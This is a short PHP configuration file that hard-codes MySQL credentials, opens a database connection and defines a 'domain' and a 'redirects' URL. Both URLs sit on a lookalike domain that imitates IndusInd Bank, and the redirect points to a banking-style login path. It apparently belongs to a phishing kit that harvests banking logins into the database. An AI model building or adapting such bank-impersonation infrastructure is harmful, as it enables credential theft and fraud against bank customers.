<?php
define("HOST", "localhost");
define("USER", "indusind_indusind_indusindnet");
define("PASSWORD", "indusind_indusindnet");
define("DATABASE", "indusind_indusindnet");

$connection = mysqli_connect(HOST, USER, PASSWORD, DATABASE);

if (!$connection) {
         die('not conneted to databse');
}

$domain = "https://indusind.indusindnet.com/";
$redirects = "https://indusindbank.indusindnet.com/corp/BANKAWAY.php";
?>

